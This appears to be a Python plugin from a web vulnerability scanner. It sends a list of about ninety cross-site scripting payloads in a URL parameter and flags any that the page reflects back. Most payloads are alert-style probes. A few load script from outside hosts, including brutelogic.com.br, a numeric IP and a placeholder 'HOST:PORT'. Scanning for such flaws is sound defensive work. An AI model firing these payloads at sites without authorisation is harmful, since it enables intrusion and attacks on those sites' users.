from src.vat.plugins.ssl_handler import handle_ssl_verification
from urllib.parse import urlencode


def check_xss(url, payload, verify_ssl=True, ssl_cert=None, ignore_ssl_errors=False):
    # XSS payloads
    xss_payloads = [
        "'-prompt(8)-'",
        "';a=prompt,a()//'",
        "';a=prompt,a()//'",
        "<image/src/onerror=prompt(8)>",
        "<img/src/onerror=prompt(8)>",
        "<image src/onerror=prompt(8)>",
        "<img src/onerror=prompt(8)>",
        "<image src=q onerror=prompt(8)>",
        "<img src=q onerror=prompt(8)>",
        "</scrip</script>t><img src=q onerror=prompt(8)>",
        "<svg onload=alert(1)>",
        "'><svg onload=alert(1)//'",
        "'onmouseover=alert(1)//'",
        "'autofocus/onfocus=alert(1)//'",
        "'-alert(1)-'",
        "'-alert(1)//'",
        "\"\'-alert(1)//\'",
        "'</script><svg onload=alert(1)>'",
        "<x contenteditable onblur=alert(1)>lose focus!</x>",
        "<x onclick=alert(1)>click this!</x>",
        "<x oncopy=alert(1)>copy this!</x>",
        "<x oncontextmenu=alert(1)>right click this!</x>",
        "<x oncut=alert(1)>copy this!</x>",
        "<x ondblclick=alert(1)>double click this!</x>",
        "<x ondrag=alert(1)>drag this!</x>",
        "<x contenteditable onfocus=alert(1)>focus this!</x>",
        "<x contenteditable oninput=alert(1)>input here!</x>",
        "<x contenteditable onkeydown=alert(1)>press any key!</x>",
        "<x contenteditable onkeypress=alert(1)>press any key!</x>",
        "<x contenteditable onkeyup=alert(1)>press any key!</x>",
        "<x onmousedown=alert(1)>click this!</x>",
        "<x onmousemove=alert(1)>hover this!</x>",
        "<x onmouseout=alert(1)>hover this!</x>",
        "<x onmouseover=alert(1)>hover this!</x>",
        "<x onmouseup=alert(1)>click this!</x>",
        "<x contenteditable onpaste=alert(1)>paste here!</x>",
        "<script>alert(1)//</script>",
        "<script>alert(1)<!--</script>",
        "<script src=//brutelogic.com.br/1.js></script>",
        "<script src=//3334957647/1></script>",
        "%3Cx%20onxxx=alert(1)",
        "<%78%20onxxx=1",
        "<x%20%6Fnxxx=1",
        "<x%20o%6Exxx=1",
        "<x%20on%78xx=1",
        "<x%20onxxx%3D1",
        "<X%20onxxx=1",
        "<x%20OnXxx=1",
        "<X%20OnXxx=1",
        "<x%20onxxx=1%20onxxx=1",
        "<x/onxxx=1>",
        "<x%09onxxx=1>",
        "<x%0Aonxxx=1>",
        "<x%0Conxxx=1>",
        "<x%0Donxxx=1>",
        "<x%2Fonxxx=1>",
        "<x%201='1'onxxx=1>",
        "<x%201=\"1\"onxxx=1>",
        "<x%20</onxxx=1>",
        "<x%201=\">\" onxxx=1>",
        "<http://onxxx%3D1/>",
        "<x onxxx=alert(1) 1='",
        "<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>",
        "'onload=alert(1)><svg/1='",
        "'>alert(1)</script><script/1='",
        "*/alert(1)</script><script>/*",
        "*/</script>'>alert(1)/*<script/1='",
        "<script>alert(1)</script>",
        "<script src=javascript:alert(1)></script>",
        "<iframe src=javascript:alert(1)></iframe>",
        "<embed src=javascript:alert(1)></embed>",
        "<a href=javascript:alert(1)>click</a>",
        "<math><brute href=javascript:alert(1)>click</brute></math>",
        "<form action=javascript:alert(1)><input type=submit></form>",
        "<isindex action=javascript:alert(1) type=submit value=click>",
        "<form><button formaction=javascript:alert(1)>click</button></form>",
        "<form><input formaction=javascript:alert(1) type=submit value=click></form>",
        "<form><input formaction=javascript:alert(1) type=image value=click></form>",
        "<form><input formaction=javascript:alert(1) type=image src=SOURCE></form>",
        "<isindex formaction=javascript:alert(1) type=submit value=click>",
        "<object data=javascript:alert(1)></object>",
        "<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;></iframe>",
        "<svg><script xlink:href=data:,alert(1) /></svg>",
        "<math><brute xlink:href=javascript:alert(1)>click</brute></math>",
        "<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&></a></svg>",
        "<html ontouchstart=alert(1)></html>",
        "<html ontouchend=alert(1)></html>",
        "<html ontouchmove=alert(1)></html>",
        "<html ontouchcancel=alert(1)></html>",
        "<body onorientationchange=alert(1)></body>",
        "<svg xmlns=\\\"http://www.w3.org/2000/svg\\\" onload=\\\"alert(document.domain)\\\"/>",
    ]

    total_payloads = len(xss_payloads)
    vulnerable_payloads = []

    for index, xss_payload in enumerate(xss_payloads, start=1):
        print(f"Scanning XSS payload {index} out of {total_payloads}")

        # Combine the payload with the original payload
        combined_payload = f"{payload}{xss_payload}"

        # Encode the payload for URL parameters
        encoded_payload = urlencode({"q": combined_payload})

        # Construct the URL with the encoded payload
        xss_url = f"{url}?{encoded_payload}"

        # Send the request with the XSS payload
        response, success = handle_ssl_verification(
            xss_url, verify_ssl, ssl_cert, ignore_ssl_errors)
        if success:
            # Check if the XSS payload is reflected in the response
            if xss_payload in response.text:
                print(
                    f"XSS payload '{xss_payload}' reflected in the response.")
                vulnerable_payloads.append(xss_payload)

    if vulnerable_payloads:
        print(f"\nXSS vulnerabilities found for {url}:")
        for payload in vulnerable_payloads:
            print(f"- {payload}")
        return True
    else:
        print(f"\nNo XSS vulnerabilities found for {url}")
        return False
